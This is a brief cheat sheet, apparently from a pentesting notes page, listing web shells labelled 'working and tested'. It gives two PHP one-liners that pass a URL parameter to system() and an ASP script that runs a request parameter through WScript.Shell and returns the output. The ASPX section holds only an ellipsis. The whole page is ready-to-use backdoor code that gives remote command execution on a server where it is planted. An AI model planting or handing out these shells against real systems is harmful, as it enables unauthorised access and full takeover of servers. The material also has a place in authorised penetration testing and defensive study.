# Web Shells (working and tested)
## PHP
<pre>
&lt;?php system($_GET['cmd']); ?&gt;
&lt;?php system($_GET[1]); ?&gt;
</pre>
## ASP
<pre>
&lt;%
Set rs = CreateObject("WScript.Shell")
'Set cmd = rs.Exec("cmd /c whoami")
Set cmd = rs.Exec("cmd /c " & request("cmd"))
o = cmd.StdOut.Readall()
Response.write(o)
%&gt;
</pre>
## ASPX
...
